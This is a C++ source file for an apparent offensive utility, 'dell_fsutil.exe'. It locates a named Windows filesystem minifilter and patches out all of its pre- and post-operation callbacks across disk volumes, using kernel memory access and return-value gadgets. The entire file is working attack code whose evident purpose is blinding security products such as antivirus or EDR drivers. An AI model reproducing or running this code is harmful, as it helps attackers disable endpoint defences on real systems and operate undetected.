#include <Windows.h>
#include "memory.h"
#include "FltUtil.h"

int main(int argc, char** argv) {
	if (argc != 2) {
		puts("Useage: dell_fsutil.exe <FILTER_NAME>");
		return -1;
	}

	char* strFilterName = argv[1];
	wchar_t* wstrFilterName = new wchar_t[strlen(strFilterName) + 2];
	size_t numConv = 0;
	mbstowcs_s(&numConv, wstrFilterName, strlen(strFilterName) + 2,strFilterName, strlen(strFilterName));
	printf("Enumerating for filter %S\n", wstrFilterName);

	Memory m = Memory();
	FltManager oFlt = FltManager(&m);
	HANDY_FUNCTIONS gl_hf = { 0 };

	BOOL resolvedPatchFuncs = oFlt.ResolveFunctionsForPatch(&gl_hf);

	if (!resolvedPatchFuncs) {
		puts("Failed to resolve functions used for patching!");
		exit(-1);
	}

	printf("Found return one gadget at %llx\n", (DWORD64)gl_hf.FuncReturns1);
	printf("Found return zero gadget at %llx\n", (DWORD64)gl_hf.FuncReturns0);

	DWORD dwX = oFlt.GetFrameCount();
	printf("Flt globals is at %p\n", oFlt.lpFltGlobals);
	printf("%d frames available\n", dwX);
	printf("Frame list is at %p\n", oFlt.lpFltFrameList);
	
	PVOID lpFilter = oFlt.GetFilterByName(wstrFilterName);
	if (!lpFilter) {
		puts("Target filter not found, exiting...");
		exit(-1);
	}


	PVOID lpFrame = oFlt.GetFrameForFilter(lpFilter);
	if (!lpFrame) {
		puts("Failed to get frame for filter!");
		exit(-1);
	}

	printf("Frame for filter is at %p\n", lpFrame);

	auto vecOperations = oFlt.GetOperationsForFilter(lpFilter);
	for (auto op : vecOperations) {
		const char* strOperation = g_IrpMjMap.count((BYTE)op.MajorFunction) ?  g_IrpMjMap[(BYTE)op.MajorFunction] : "IRP_MJ_UNDEFINED";
		printf("MajorFn: %s\nPre: %p\nPost %p\n", strOperation, op.PreOperation, op.PostOperation);
	}

	auto frameVolumes = oFlt.EnumFrameVolumes(lpFrame);
	const wchar_t* strHardDiskPrefix = LR"(\Device\HarddiskVolume)";
	
	BOOL bRes = oFlt.RemovePrePostCallbacksForVolumesAndCallbacks(vecOperations, frameVolumes, &gl_hf);
	if (!bRes) {
		puts("Error patching pre and post callbacks!");
		exit(-1);
	}

	return 0;
}